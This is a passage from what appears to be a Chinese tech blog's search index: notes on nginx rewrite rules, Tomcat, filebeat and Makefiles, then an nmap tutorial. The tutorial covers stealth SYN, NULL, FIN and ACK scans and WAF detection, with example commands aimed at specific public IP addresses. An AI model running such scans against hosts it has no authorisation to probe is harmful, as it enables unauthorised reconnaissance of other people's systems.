字段来决定让哪个虚拟主机处理访问请求\n\n要配置访问 /aa 到  /var/www/hello.test.com/index.html ，你应该使用 alias 而不是 root\n要配置访问 /aa 到  /var/www/hello.test.com/aa/index.html 则使用root 会将匹配路径带入URI\n配置子目录应该闭合，不要使用 /aa ，应该使用 /aa/ ; /aa 用于文件匹配\nalias后面必须要用“/”结束，否则会找不到文件的;而root则可有可无\n在 / 中配置root，在 /other 中配置alias是一个好习惯。\n\nindex index.html index.htm;\n\nlocation  /html {\n   alias /usr/share/nginx/;      ## /usr/share/nginx/\n   autoindex on;\n   autoindexlocaltime on;\n   autoindexexactsize off;\n}\nlocation /download/ {\n    root /etc/nginx;              ## /etc/nginx/download\n    index index.html index.htm;\n}\n\n禁用php脚本解析\nlocation ~ ^/uploads/..(php|php5)$ {\n      deny all;\n}\n\nhttps://regexper.com\n. ： 匹配除换行符以外的任意字符\n\\d ：匹配数字\n\n? ： 重复0次或1次\n： 重复1次或更多次\n： 重复0次或更多次\n\n^ ： 匹配字符串的开始\n$ ： 匹配字符串的介绍\n{n} ： 重复n次\n{n,} ： 重复n次或更多次\n[c] ： 匹配单个字符c\n[a-z] ： 匹配a-z小写字母的任意一个\n\n location匹配规则\n语法规则（按优先级）(=)   (^~)   (~,~)   ( )   (/)\n\n    =     精确匹配\n    ^~    url路径匹配 一般用来匹配目录,nginx不对url做编码，因此请求为/static/20%/aa，可以被规则^~ /static/ /aa匹配到（注意是空格）\n    ~     区分大小写的正则匹配\n    ~    不区分大小写的正则匹配\n    !~    区分大小写不匹配的正则\n    !~   不区分大小写不匹配的正则\n    ' '   普通匹配\n    @     命名的 location，使用在内部定向时，例如 errorpage, tryfiles\n    /  通用匹配，任何请求都会匹配到。\n\nNginx下的rewrite规则\n\n一．正则表达式匹配，其中：\n ~ 为区分大小写匹配\n ~ 为不区分大小写匹配\n !~和!~ 分别为区分大小写不匹配及不区分大小写不匹配\n\n二．文件及目录匹配，其中：\n -f和!-f用来判断是否存在文件\n -d和!-d用来判断是否存在目录\n -e和!-e用来判断是否存在文件或目录\n -x和!-x用来判断文件是否可执行\n\nrewrite regex replacement [flag];\n\n三．rewrite指令的最后一项参数为flag标记，四种flag标记：\n注: 这里的地址栏url不变，只是针对站内的url地址而言，只要是url重写必定改变地址栏\n为空 - 地址栏url不变，但是内容已经变化，也是永久性的重定向。地址栏url不变\nlast - url重写后，停止处理后续rewrite指令集马上发起一个新的请求，再次进入server块，重试location匹配，超过10次匹配不到报500错误，地址栏url不变 ;内部跳转,只对站内url重写有效\nbreak - url重写后，停止处理后续rewrite指令集，并不在重新查找,直接使用当前资源，不再执行location里余下的语句，完成本次请求，地址栏url不变\nredirect - 返回302临时重定向，url会跳转，爬虫不会更新url。 地址栏url重写\npermanent - 返回301永久重定向。url会跳转。爬虫会更新url。 地址栏url重写\n\n1.last        相当于apache里面的[L]标记，表示rewrite。\n2.break       本条规则匹配完成后，终止匹配，不再匹配后面的规则。\n3.redirect    返回302临时重定向，浏览器地址会显示跳转后的URL地址。\n4.permanent   返回301永久重定向，浏览器地址会显示跳转后的URL地址。\n\nlocation /download/ {\n    rewrite ^(/download/.)/media/(.)..$ $1/mp3/$2.mp3 break;\n    rewrite ^(/download/.)/audio/(.)..*$ $1/mp3/$2.ra break;\n    return 403;\n}\n\n上面的正则表达式的一部分可以用圆括号，方便之后按照顺序用$1-$9来引用。\n小括号()之间匹配的内容，可以在后面通过$1来引用，$2表示的是前面第二个()里的内容。正则里面容易让人困惑的是\\转义特殊字符。\n\n如果我们将类似URL/photo/123456 重定向到/path/to/photo/12/1234/123456.png\nrewrite \"/photo/([0-9]{2})([0-9]{2})([0-9]{2})\"/path/to/photo/$1/$1$2/$1$2$3.png ;\n\n如果一个URI匹配指定的正则表达式regex，URI就按照replacement重写。\nrewrite按配置文件中出现的顺序执行。flags标志可以停止继续处理。\n如果replacement以\"http://\"或\"https://\"开始，将不再继续处理，这个重定向将返回给客户端。\nflag可以是如下参数\nlast 停止处理后续rewrite指令集，然后对当前重写的新URI在rewrite指令集上重新查找。\nbreak 停止处理后续rewrite指令集，并不在重新查找,但是当前location内剩余非rewrite语句和location外的的非rewrite语句可以执行。\nredirect 如果replacement不是以http:// 或https://开始，返回302临时重定向\npermant 返回301永久重定向\n最终完整的重定向URL包括请求scheme(http://,https://等),请求的servernameinredirect和 portinredirec三部分 ，说白了也就是http协议 域名 端口三部分组成。\n\nnginx的全局变量 ngxhttpcore_module模块提供的变量","tags":null},{"location":"//blog.pytool.com/basic/2015-01-01 正则表达式","title":"正则表达式前端使用手册","text":"---\n\ntitle: 正则表达式前端使用手册\ndate: 2017-06-15T14:08:22+08:00\ncategories: [正则]\nauthor: louis\nauthorLink: http://louiszhai.github.io","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 vlc","title":"Linux命令 VLC","text":"vlc的流输出功能\n2)使用rtsp进行传输\nvlc Android.mp4 -vvv  --loop --sout \"#rtp{sdp=rtsp://127.0.0.1:10086/stream}\"","tags":null},{"location":"//blog.pytool.com/Post/tomcat/2016-06-01 tomcat启动慢","title":"Tomcat启动慢","text":"有两种解决办法：\n\n1）在Tomcat环境中解决\n\n可以通过配置JRE使用非阻塞的Entropy Source。\n\n在catalina.sh中加入这么一行：-Djava.security.egd=file:/dev/./urandom 即可。\n\n加入后再启动Tomcat，整个启动耗时下降到Server startup in 2912 ms。\n\n2）在JVM环境中解决\n\n打开$JAVA_PATH/jre/lib/security/java.security这个文件，找到下面的内容：\n\nsecurerandom.source=file:/dev/random\n\n替换成\n\nsecurerandom.source=file:/dev/urandom\n\nsed -i 's|securerandom.source=file:/dev/random|securerandom.source=file:/dev/urandom|g' /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/security/java.security \u0026\u0026 \\","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 repo","title":"Linux命令 repo","text":"video width=\"498\" height=\"510 \" src=\"http://player.youku.com/embed/XNTkyMTM0MzY4\" poster=\" \" autoplay=\"autoplay\"\n/video","tags":null},{"location":"//blog.pytool.com/Post/Elastic/beats/2016-10-04 filebeat自定义@timestamp","title":"解决filebeat的@timestamp无法被json日志的同名字段覆盖的问题","text":"默认@timestamp是filebeat读取日志时的时间戳，但是我们在读取日志的时候希望根据日志生成时间来展示，以便根据日志生成时间点来定位问题。\n\n这是我生成json日志的格式：\n    {\"@timestamp\":\"2017-03-23T09:48:49.304603+08:00\",\"@source\":\"vagrant-ubuntu-trusty-64\",\"@fields\":{\"channel\":\"xhh.mq.push\",\"level\":200,\"ctxtqueue\":\"jobqueue2\",\"ctxtexchange\":\"\",\"ctxtconfirmselected\":true,\"ctxtconfirmpublished\":true,\"ctxtproperties\":{\"confirm\":true,\"transaction\":false,\"exchange\":[],\"queue\":[],\"message\":[],\"consume\":[],\"bindingkeys\":[],\"exchange2\":{\"type\":\"direct\"}}},\"@message\":\"904572:58d31d7ddc790:msgparam1~\",\"@tags\":[\"xhh.mq.push\"],\"@type\":\"xhh.mq.push\"}\n日志中包含了@timestamp，但是用filebeat收集日志后，@timestamp被filebeat自动生成的时间给覆盖了：\n    {\n            \"offset\" =  413806671,\n           \"@source\" =  \"vagrant-ubuntu-trusty-64\",\n             \"@tags\" =  [\n            [0] \"xhh.mq.push\"\n        ],\n             \"@type\" =  \"xhh.mq.push\",\n        \"inputtype\" =  \"log\",\n            \"source\" =  \"/tmp/xhhmq20170323.log\",\n              \"type\" =  \"rabbitmq\",\n           \"@fields\" =  {\n                     \"ctxtexchange\" =  \"\",\n             \"ctxtconfirmselected\" =  true,\n                             \"level\" =  200,\n                           \"channel\" =  \"xhh.mq.push\",\n                   \"ctxtproperties\" =  {\n                     \"confirm\" =  true,\n                   \"exchange2\" =  {\n                    \"type\" =  \"direct\"\n                },\n                    \"exchange\" =  nil,\n                     \"consume\" =  nil,\n                     \"message\" =  nil,\n                 \"transaction\" =  false,\n                       \"queue\" =  nil,\n                \"bindingkeys\" =  nil\n            },\n                        \"ctxtqueue\" =  \"jobqueue0\",\n            \"ctxtconfirmpublished\" =  true\n        },\n              \"tags\" =  [\n            [0] \"beatsinputrawevent\"\n        ],\n          \"@message\" =  \"995428:58d31d7ddc790:msgparam1~\",\n        \"@timestamp\" =  2017-03-24T01:00:00.930Z,\n              \"beat\" =  {\n            \"hostname\" =  \"vagrant-ubuntu-trusty-64\",\n                \"name\" =  \"vagrant-ubuntu-trusty-64\",\n             \"version\" =  \"5.2.1\"\n        },\n          \"@version\" =  \"1\",\n              \"host\" =  \"vagrant-ubuntu-trusty-64\"\n    }\n时间变成了filebeat读取日志时的时间，这完全不是我想要的，没办法网上找解决方式，发现GitHub官网也有人在问同个问题，链接地址：https://github.com/logstash-plugins/logstash-input-beats/issues/33\n\n话说好像是bug？评论里说可以用grok进行转换，即在日志里先定义一个messageTimestamp字段，然后filebeat推到logstash后再通过filter配置将其转换为logstash的timestamp，貌似这也可以，不过应该会有更简便的解决方式的才对。在万能的谷哥引导下，原来filebeat最新版已经解决了这个问题了~ So就是这里了：https://www.elastic.co/guide/en/beats/filebeat/current/configuration-filebeat-options.html#config-json\n\n在filebeat.yml配置文件中加上以下两行搞定：\n\n    json.keysunderroot: true\n    json.overwritekeys: true\n\n文档里json共有四个配置节点：\n\n    keysunderroot\n\n        默认这个值是FALSE的，也就是我们的json日志解析后会被放在json键上。设为TRUE，所有的keys就会被放到根节点。\n\n    overwritekeys\n\n        是否要覆盖原有的key，这是关键配置，将keysunderroot设为TRUE后，再将overwritekeys也设为TRUE，就能把filebeat默认的key值给覆盖了。\n\n    adderrorkey\n\n        添加jsonerror key键记录json解析失败错误\n\n    message_key\n\n        指定json日志解析后放到哪个key上，默认是json，你也可以指定为log等。","tags":null},{"location":"//blog.pytool.com/Post/shell/Makefile","title":"Makefile 详解","text":"基本原则\n\n.PYTHON伪目标总是不如其它文件“新”，因此它总是被执行。\n@ \t使命令在被执行前不被回显。\n– \t使任何命令行的任何非零退出状态都被忽略。\n使命令行可以通过指定 -n、-q 或 -t 选项来执行。\n\n 模式变量 %\nargets定义了一系列的目标文件，可以有通配符。是目标的一个集合。\ntarget-parrtern是指明了targets的模式，也就是的目标集模式。\nprereq-parrterns是目标的依赖模式，它对target-parrtern形成的模式再进行一次依赖目标的定义。\n\n这样描述这三个东西，可能还是没有说清楚，还是举个例子来说明一下吧。\n如果我们的target-parrtern定义成“%.o”，意思是我们的集合中都是以“.o”结尾的，而如果我们的prereq-parrterns定义成“%.c”，意思是对target-parrtern所形成的目标集进行二次定义，其计算方法是，取target-parrtern模式中的“%”（也就是去掉了[.o]这个结尾），并为其加上[.c]这个结尾，形成的新集合。\n\n所以，我们的“目标模式”或是“依赖模式”中都应该有“%”这个字符，如果你的文件名中有“%”那么你可以使用反斜杠“\\”进行转义，来标明真实的“%”字符。\n\n看一个例子：\nobjects = foo.o bar.o\nall: $(objects)\n$(objects):\n%.o: %.c\n  $(CC) -c $(CFLAGS) $\u003c -o $@\n上面的例子中，指明了我们的目标从$object中获取，“%.o”表明要所有以“.o”结尾的目标，\n也就是“foo.o bar.o”，也就是变量$object集合的模式，而依赖模式“%.c”则取模式“%.o”的“%”，也就是“foobar”，并为其加下“.c”的后缀，于是，我们的依赖目标就是“foo.cbar.c”。\n而命令中的“$\u003c”和“$@”则是自动化变量，“$\u003c”表示所有的依赖目标集（也就是“foo.c bar.c”），“$@”表示目标集（也就是foo.o bar.o”）。于是，上面的规则展开后等价于下面的规则：\n\nfoo.o : foo.c\n  $(CC) -c $(CFLAGS) foo.c -o foo.o\nbar.o : bar.c\n  $(CC) -c $(CFLAGS) bar.c -o bar.o\n试想，如果我们的“%.o”有几百个，那种我们只要用这种很简单的“静态模式规则”就可以写完一堆规则，实在是太有效率了。“静态模式规则”的用法很灵活，如果用得好，那会一个很强大的功能。再看一个例子：\n\n   files = foo.elc bar.o lose.o\n\n   $(filter %.o,$(files)): %.o: %.c\n\n           $(CC) -c $(CFLAGS) $\u003c -o $@\n\n   $(filter %.elc,$(files)): %.elc: %.el\n\n           emacs -f batch-byte-compile $\u003c\n\n$(filter%.o,$(files))表示调用Makefile的filter函数，过滤“$filter”集，只要其中模式为“%.o”的内容。其的它内容，我就不用多说了吧。这个例字展示了Makefile中更大的弹性。\n\n自动变量 $\n$@          --代表目标文件(target)\n$^          --代表所有的依赖文件(components)\n$\u003c          --代表第一个依赖文件(components中最左边的那个)。\n\n要生成目标 ... : 生成目标所需的依赖 ...\n\tcommand 必须要以[Tab]键开始\n\nexportunexport 传递变量到下级 Makefile 中\n\n  $@\n表示规则中的目标文件集。在模式规则中，如果有多个目标，那么，\"$@\"就是匹配于\n目标中模式定义的集合。\n  $% 仅匹配目标文件\n仅当目标是函数库文件中，表示规则中的目标成员名。例如，如果一个目标是\"foo.a\n(bar.o)\"，那么，\"$%\"就是\"bar.o\"，\"$@\"就是\"foo.a\"。如果目标不是函数库文件（Unix\n下是[.a]，Windows 下是[.lib]），那么，其值为空。\n  $\u003c\n依赖目标中的第一个目标名字。如果依赖目标是以模式（ 即\"%\"）定义的，那么\"$\u003c\"将\n是符合模式的一系列的文件集。注意，其是一个一个取出来的。\n  $? 依赖的集合(只提取比目标新的)\n所有比目标新的依赖目标的集合。以空格分隔。\n  $^ 依赖的集合(去重)\n所有的依赖目标的集合。以空格分隔。如果在依赖目标中有多个重复的，那个这个变量\n会去除重复的依赖目标，只保留一份。\n  $+ 依赖的集合(不去重)\n这个变量很像\"$^\"，也是所有依赖目标的集合。只是它不去除重复的依赖目标。\n  $ 去除后缀名(不推荐使用)\n这个变量表示目标模式中\"%\"及其之前的部分。如果目标是\"dir/a.foo.b\"，并且目标的\n模式是\"a.%.b\"，那么，\"$\"的值就是\"dir/a.foo\"。这个变量对于构造有关联的文件名是比\n较有较。如果目标中没有模式的定义，那么\"$\"也就不能被推导出，但是，如果目标文件的\n后缀是 make 所识别的，那么\"$\"就是除了后缀的那一部分。例如：如果目标是\"foo.c\"，因\n为\".c\"是 make 所能识别的后缀名，所以，\"$\"的值就是\"foo\"。这个特性是 GNU make 的，\n\n很有可能不兼容于其它版本的 make，所以，你应该尽量避免使用\"$\"，除非是在隐含规则\n或是静态模式中。如果目标中的后缀是 make 所不能识别的，那么\"$\"就是空值。\n\n在Makefile中写shell代码有点诡异，和不同的shell语法不太一样，如果不了解，看Makefile会莫名其妙。下面总结了一些。\nMakefile和Shell\nMakefile本质上来讲也是shell脚本，即每条command都是shell进程，运行完shell进程都会退出\ntest:\n  gcc -c main.c -o main.o\n  gcc -c a.c -o a.o\n这样输入make test，结果相当于两个进程，都退出了。\n\n等价于在shell下输命令一样。\nmytest:\n  cd /home;mkdir test\n这里make mytest，结果相当于一个进程。当前目录是/root 而\nowntest:\n  cd /home\n  mkdir test\n此时make owntest，相当于两个进程，\n第一个进程是cd /home,运行完回到了/root。这时再运行第二个shell命令就会在/root下创建一个test目录.(makefile中的shell进程命令，跟直接在shell输的命令相同，但是它都会结束本身，即exit)\n\n Makefile 中变量赋值\n1：尽在Makefile文件的目标项冒号后的另起一行的代码才是shell代码。\n\n第一种方式：\n\nxx = xx1         // 这里时makefile代码\n\n第二种方式：\nyy：xx = xx2       // 这是是makefile代码，makefile允许变量赋值时，'='号两边留空格  ？？？？？？可以吗\n\n第三种方式：\nyy：\n   xx=xx3         // 只有这里是shell代码 ，shell不允许‘=’号两边有空格哦。\nyy:\n   xx= xx3        // 只有这里是shell代码 ，shell不允许‘=’号两边有空格哦。\n\n注意此时xx的值是\" xx3\"，多了一个空格\n\n有一个例外：\nxx=$(shell 这里的代码也是shell代码)\n\n变量传递\n2：Makefile中的shell，每一行是一个进程，不同行之间变量值不能传递。所以，Makefile中的shell不管多长也要写在一行。\neg：\n\nSUBDIR=src example\n\nall:\n\n   @for subdir in $(SUBDIR); /      // 这里往下是一行shell\n\n   do/\n\n       echo \"building \" $$subdir; /\n\n   done\n\n 变量引用 Ｍakefile变量$ shell的变量$$\n3：Makefile中的变量以$开头，使用$(VAR)或${VAR}来引用变量的定义。 所以，为了避免和shell的变量冲突，shell的变量以$$开头\n\n注意：Makefile中在对一些简单变量的引用，我们也可以不使用“（）”和“{}”来标记变量名，而直接使用“$x”的格式来实现，此种用法仅限于变量名为单字符的情况。另外自动化变量也使用这种格式。对于一般多字符变量的引用必须使用括号了标记，否则make将把变量名的首字母作为作为变量而不是整个字符串（“$PATH”在Makefile中实际上是“$(P)ATH”）。这一点和shell中变量的引用方式不同。shell中变量的引用可以是“${xx}”或者“$xx”格式。但在Makefile中多字符变量名的引用只能是“$(xx)”或者“${xx}”格式。\n\neg1：从当前目录路径中提取出 /application 或 /baseclass 之前的部分\nPROJECTROOTDIR = $(shell pwd | awk -F'/application|/baseclass' '{print $$1}')\neg2：上例中$$subdir就是shell中的变量， 而$(SUBDIR)是Makefile的中的变量\n\n变量输出 @隐藏自身的输出 - 出错继续运行\n\n如果make执行的命令前面加了@字符，则不显示命令本身而只显示它的结果; Android中会定义某个变量等于@，例如 hide:= @\n通常make执行的命令如果出错（该命令的退出状态非0）就立刻终止，不再执行后续命令，但如果命令前面加了-号，即使这条命令出错，make也会继续执行后续命令。\n通常rm命令和mkdir命令前面要加-号，因为rm要删除的文件可能不存在，mkdir要创建的目录可能已存在，这两个命令都有可能出错，但这种错误是应该忽略的。\n\n1、在Makefile中只能在target中调用Shell脚本，其他地方是不能输出的。比如如下代码就是没有任何输出：\nVAR=\"Hello\"\necho \"$(VAR)\"\n\nall:\n  .....\n以上代码任何时候都不会输出，没有在target内，如果上述代码改为如下：\nVAR=\"Hello\"\n\nall:\n   echo \"$(VAR)\"\n   .....\n以上代码，在make all的时候将会执行echo命令。\n\n最后打印结果是:\necho \"\"Hello\"\"\n\"Hello\"\n\n2、在Makefile中执行shell命令，一行创建一个进程来执行。这也是为什么很多Makefile中有很多行的末尾都是“;  \\”，以此来保证代码是一行而不是多行，这样Makefile可以在一个进程中执行，例如：\nSUBDIR=src example\nall:\n   @for subdir in $(SUBDIR); \\\n   do\\\n       echo \"building \"; \\\n   done\n上述可以看出for循环中每行都是以”; \\”结尾的。\n\n3、Makefile中所有以$打头的单词都会被解释成Makefile中的变量。如果你需要调用shell中的变量（或者正则表达式中锚定句位$），都需要加两个$符号（$$）。实例如下：\nPATH=\"/data/\"\n\nall:\n   echo ${PATH}/Makefile中变量，即\"/data\"/\n   echo $$PATH /shell中的变量*/\n例子中的第一个${PATH}引用的是Makefile中的变量，而不是shell中的PATH环境变量，后者引用的事Shell中的PATH环境变量。\n\n    以上三点的是Makefile调用shell应该注意的地方，写Makefile一定要注意。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 nmap","title":"安全工具 Nmap","text":"端口扫描之王——nmap入门精讲（一） - 推酷\n端口扫描之王——nmap入门精讲（二） - 谢灿勇 - 博客园\n渗透测试之Nmap命令（一） - Jeanphorn的专栏 - 博客频道 - CSDN.NET\nNmap是用于端口扫描，服务检测，甚至是漏洞扫描等多种功能的强大工具。Nmap从入门到高级覆盖了许多基础的概hackers115社区\nwaf检测\nnmap -p 80,443 --script=http-waf-detect www.example.com\nnmap -p 80,443 --script=http-waf-fingerprint www.example.com\n\nnmap -sV 115.28.60.222 -p 8554\nnmap -sV 139.129.108.163 -p 554,8554\n全面扫描：nmap-T4 -A targetip    \n主机发现：nmap-T4 -sn targetip   \n端口扫描：nmap-T4 targetip\n服务扫描：nmap-T4 -sV targetip  \n操作系统扫描：nmap -T4 -O targetip  \nNmap包含四项基本功能：\n\n主机发现（Host Discovery）\n端口扫描（Port Scanning）\n版本侦测（Version Detection）\n操作系统侦测（Operating System Detection）\n\n端口扫描之王——nmap入门精讲（一）\n\n端口扫描在百度百科上的定义是：\n\n端口扫描是指某些别有用心的人发送一组端口扫描消息，试图以此侵入某台计算机，并了解其提供的计算机网络服务类型(这些网络服务均与端口号相关)，但是端口扫描不但可以为黑客所利用，同时端口扫描还是网络安全工作者的必备的利器，通过对端口的扫描，了解网站中出现的漏洞以及端口的开放情况，对网站安全方面有着不可或缺的贡献，是你学习网络安全的第一门课程的首选\n\n目前在市面上主要的端口扫描工具是XScan、SuperScan、nmap，其中在这里主推的是nmap，因为nmap具有以下的这一些优点：\n\n1、多种多样的参数，丰富的脚本库，满足用户的个人定制需求，其中脚本库还提供了很多强大的功能任你选择\n\n2、强大的可移植性，基本上能在所有的主流系统上运行，而且代码是开源的\n\n3、详细的文档说明，和强大的社区团队进行支持，方面新人上手\n\nNmap是一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具，但是nmap也是有一些缺点的，比如说上手较难，但是难上手是相对的，与其他达到这种功能性的软件产品相比，还是比较容易上手的，但是这也不妨碍nmap成为世界千万安全专家列为必备的工具之一，在其中的一些影视作品中《黑客帝国2》、《特警判官》中都有亮相\n\n废话不多说，开始今天的nmap学习：\n\nnmap的安装：直接从百度上下载，然后安装的步骤跟其他的软件一样，最后确认安装成功只需要在命令行中输入nmap回车，有相关的参数输出即为安装成功，安装的具体步骤可以查看：http://jingyan.baidu.com/article/5bbb5a1b1e0a7713eba179cb.html，在此就不多说了\n\nNmap包含四项基本功能：\n\n    主机发现（Host Discovery）\n    端口扫描（Port Scanning）\n    版本侦测（Version Detection）\n    操作系统侦测（Operating System Detection）\n\n下面就从主机发现一步一步进行探讨\n\n主机发现顾名思义就是发现所要扫描的主机是否是正在运行的状态，接下来就来一个简单例子\n\n例子要求：获取http://nmap.org 的主机是否开启\n\n输入命令：nmap -F -sT -v nmap.org\n\n-F：扫描100个最有可能开放的端口   \n-v 获取扫描的信息   \n-sT：采用的是TCP扫描 不写也是可以的，默认采用的就是TCP扫描\n\n补充说明：\n\n端口端口一般是有下面这几种状态的\n  状态 \t          详细的参数说明\n Open \t         端口开启，数据有到达主机，有程序在端口上监控\n Closed \t       端口关闭，数据有到达主机，没有程序在端口上监控\n Filtered \t     数据没有到达主机，返回的结果为空，数据被防火墙或者是IDS过滤\n UnFiltered \t   数据有到达主机，但是不能识别端口的当前状态\n Open|Filtered \t 端口没有返回值，主要发生在UDP、IP、FIN、NULL和Xmas扫描中\n Closed|Filtered 只发生在IP ID idle扫描\n\n图中的4是本次返回的关键信息，其中我们要主要关注的是端口号，端口状态，端口上的服务\n\n那你可能就会要问为什么要关注这些端口呢？那这个问题就要转到探讨为什么要进行扫描？\n\n扫描对于黑客和安全人员来说，主要的流程是这样的\n\n上面的图中的IP写错了，应该改为FTP\n\n从这个图中我们不难发现，我们主要关注的区域就是这些内容\n\n接下来就来讨论下面上面提出来的问题？怎样对URL解析的时间进行优化，在Nmap重提供了不进行解析的参数(-n),这样就不会对域名进行解析了\n\n其中关于域名解析的相关参数还有：\n\n-R 为所有的目标主机进行解析\n\n--system-dns 使用系统域名解析器进行解析，这个解析起来会比较慢\n\n--dns-server 服务器选择DNS解析\n\n说到-R注释的意思你会有所体会，其实nmap的扫描解析不止是对一个目标主机进行解析，还可以对一定范围内的目标主机群进行解析\n\n例如：查找45.33.49.119-120的主机的状态以及端口状态\n\n分析：\n\n1、虽然查找的主机的数量不多，但是这样查找起来也是很浪费时间的， 所有我们可以通过使用快速查找的方法来节约时间\n\n快速查找端口方法的原理如下：\n\n默认的情况下，我们的查找是查找最有可能开放的1000端口，但是使用快速端口查找(参数 -F )会查找最有可能开放的100个端口，这样也就节约了10倍的时间\n\n 2、这里我们需要获取端口的状态，所以就不能使用参数(-sn)，这个参数是可以跳过端口扫描，直接进行主机发现的\n\n输入命令：nmap -F -sT -v -n 45.33.49.119-120      45.33.49.119:nmap.org的IP地址\n\nPS:1、-sn参数只能扫描的主机，不能扫描端口，另一个参数也要特别注意的是（-PE）通过ICMP echo判定主机是否存活\n\n运行情况如下：\n\n图片中的1处指的是，采用sT的扫描方法，这种扫描方法准确，速度快，但是这样的扫描容易被防火墙和IDS发现并记录，所以这种方法，实际中并不多用\n\n由图中的3处我们可以知道在不进行解析的情况下扫描用时为26.92秒，比解析的时候用的时间节约了不少\n\n图中的4说明了扫描了2个主机，然后只有一个主机为开启\n\n 提示：\n\n在nmap运行的时候，如果我们可以像其他编程一样打“断点”，直接按键盘的d键就行了，如果想知道运行的进度可以按下X键\n\n好了，示例也讲完了，下面我们就来分析一下扫描的各种方法：\n\n 端口扫描\n\n1、TCP扫描（-sT）\n\n这是一种最为普通的扫描方法，这种扫描方法的特点是：扫描的速度快，准确性高，对操作者没有权限上的要求，但是容易被防火墙和IDS(防入侵系统)发现\n\n运行的原理：通过建立TCP的三次握手连接来进行信息的传递\n\n① Client端发送SYN；\n\n② Server端返回SYN/ACK，表明端口开放；\n\n③ Client端返回ACK，表明连接已建立；\n\n④ Client端主动断开连接。\n\nSYNC -  SYNC/ACK -  ACK\n\n 2、SYN扫描（-sS）\n\n这是一种秘密的扫描方式之一，因为在SYN扫描中Client端和Server端没有形成3次握手，所以没有建立一个正常的TCP连接，因此不被防火墙和日志所记录，一般不会再目标主机上留下任何的痕迹，但是这种扫描是需要root权限（对于windows用户来说，是没有root权限这个概念的，root权限是linux的最高权限，对应windows的管理员权限）\n\n运行的原理图如下：\n\nSYNC -  SYNC/ACK -  RST\n\n3、NULL扫描\n\nNULL扫描是一种反向的扫描方法，通过发送一个没有任何标志位的数据包给服务器，然后等待服务器的返回内容。这种扫描的方法比前面提及的扫描方法要隐蔽很多，但是这种方法的准确度也是较低的， 主要的用途是用来判断操作系统是否为windows，因为windows不遵守RFC 793标准，不论端口是开启还是关闭的都返回RST包\nNULL -  RST\n\n但是虽然NULL具有这样的一些用处，但是本人却认为不宜使用NULL\n\n1、NULL方法的精确度不高，端口的状态返回的不是很准确\n\n2、要获取目标主机的运行系统，可以使用参数(-O),来获取对于一些操作系统无法准确判断的，可以加上参数(-osscan-guess)\n\n3、NULL扫描易被过滤\n\n 4、FIN扫描\n\nFIN扫描的原理与NULL扫描的原理基本上是一样的在这里就不重复了\n\n5、ACK扫描\n\nACK扫描的原理是发送一个ACK包给目标主机，不论目标主机的端口是否开启，都会返回相应的RST包，通过判断RST包中的TTL来判断端口是否开启\n\n运行原理图：\n\nACK -  RST (TTL\u003c64)\n\nTTL值小于64端口开启，大于64端口关闭\n\n大致上主要的扫描方法就是这些，除了我们可以按照这样些参数去执行扫描外，还可以自己定义一个TCP扫描包\n\n6、自定义TCP扫描包的参数为（--scanflags）\n\n例如：定制一个包含ACK扫描和SYN扫描的安装包\n\n命令：nmap --scanflags ACKSYN nmap.org\n\n 好了，接下来还有各种扫描方法的端口列表参数\n\n-PS 端口列表用,隔开[tcp80 syn 扫描]\n-PA 端口列表用,隔开ack扫描【默认扫描端口1-1024】\n-PU 端口列表用,隔开[udp高端口扫描 穿越只过滤tcp的防火墙]\n\n其他的常见命令\n\n输出命令\n\n-oN 文件名 输出普通文件\n\n-oX 文件名 输出xml文件\n\n错误调试：\n\n--log-errors 输出错误日志\n\n--packet-trace 获取从当前主机到目标主机的所有节点\n\n其他的相关参数可以参考：http://www.2cto.com/Article/201203/125686.html 到时候需要再进行查找\n\n相关资料：\n\nhttp://www.tuicool.com/articles/ZBvmYrN\n\nhttp://www.2cto.com/Article/201203/125686.html\n\n在此特别感谢各位前辈为nmap提供了为数不多的宝贵资料\n\nNmap 7.01 ( https://nmap.org )\nUsage: nmap [Scan Type(s)] [Options] {target specification}\nTARGET SPECIFICATION:\n  Can pass hostnames, IP addresses, networks, etc.\n  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254\n  -iL inputfilename: Input from list of hosts/networks\n  -iR num hosts: Choose random targets\n  --exclude host1,host2,...: Exclude hosts/networks\n  --excludefile excludefile: Exclude list from file\nHOST DISCOVERY:\n  -sL: List Scan - simply list targets to scan\n  -sn: Ping Scan - disable port scan\n  -Pn: Treat all hosts as online -- skip host discovery\n  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports\n  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes\n  -PO[protocol list]: IP Protocol Ping\n  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]\n  --dns-servers serv1[,serv2],...: Specify custom DNS servers\n  --system-dns: Use OS's DNS resolver\n  --traceroute: Trace hop path to each host\nSCAN TECHNIQUES:\n  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans\n  -sU: UDP Scan\n  -sN/sF/sX: TCP Null, FIN, and Xmas scans\n  --scanflags flags: Customize TCP scan flags\n  -sI zombie host[:probeport]: Idle scan\n  -sY/sZ: SCTP INIT/COOKIE-ECHO scans\n  -sO: IP protocol scan\n  -b FTP relay host: FTP bounce scan\nPORT SPECIFICATION AND SCAN ORDER:\n  -p port ranges: Only scan specified ports\n    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9\n  --exclude-ports port ranges: Exclude the specified ports from scanning\n  -F: Fast mode - Scan fewer ports than the default scan\n  -r: Scan ports consecutively - don't randomize\n  --top-ports number: Scan number most common ports\n  --port-ratio ratio: Scan ports more common than ratio\nSERVICE/VERSION DETECTION:\n  -sV: Probe open ports to determine service/version info\n  --version-intensity level: Set from 0 (light) to 9 (try all probes)\n  --version-light: Limit to most likely probes (intensity 2)\n  --version-all: Try every single probe (intensity 9)\n  --version-trace: Show detailed version scan activity (for debugging)\nSCRIPT SCAN:\n  -sC: equivalent to --script=default\n  --script=Lua scripts: Lua scripts is a comma separated list of\n           directories, script-files or script-categories\n  --script-args=n1=v1,[n2=v2,...]: provide arguments to scripts\n  --script-args-file=filename: provide NSE script args in a file\n  --script-trace: Show all data sent and received\n  --script-updatedb: Update the script database.\n  --script-help=Lua scripts: Show help about scripts.\n           Lua scripts is a comma-separated list of script-files or\n           script-categories.\nOS 